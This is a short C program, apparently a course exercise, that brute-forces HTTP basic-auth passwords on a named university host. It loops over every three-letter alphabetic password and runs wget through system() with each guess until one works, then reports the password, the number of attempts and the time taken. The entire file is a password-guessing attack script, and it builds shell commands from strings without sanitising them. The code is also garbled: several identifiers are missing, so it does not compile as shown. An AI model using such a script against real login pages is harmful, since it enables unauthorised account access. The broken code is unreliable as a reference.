











#include<stdio.h>
#include<stdlib.h>
#include<strings.h>
#include<sys/types.h>
#include<sys/times.h>
#include<sys/time.h>
#include<unistd.h>

int ()
{
  char url[80];
  char syscom[]= "wget -nv --http-user= --http-passwd=";
  char http[] = "http://sec-crack.cs.rmit.edu./SEC/2/";
  char [] ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  char username[8];
  char pass[4];
  int i,j,k,hack=1;
  int attempt = 1;
  int , end, time_var;

   = time();
  for ( i = 0 ;i<strlen();i++)
    {
      pass[0]=[i];
      for( j = 0 ;j<strlen();j++)
        {
          pass[1]=[j];
          for ( k = 0 ;k<strlen();k++)
             {
               fflush(stdin);
               pass[2]=[k];
               pass[3]='\0';
               printf("%s\n",pass);

               sprintf(url,"%s%s %s",syscom,pass,http);
               hack = system(url);
               attempt++;
               if (hack == 0)
               {
                  end = time();
                  time_var = (end-);
                  printf("\nbr	The password is :%s",pass);
                  printf("\nNo. of Attempts   crack the password :%d",attempt);
                  printf("\nTime taken  crack the password = %lld sec\n",time_var/1000000000);
                  exit(1);
                }
              }
          }
      }
 }

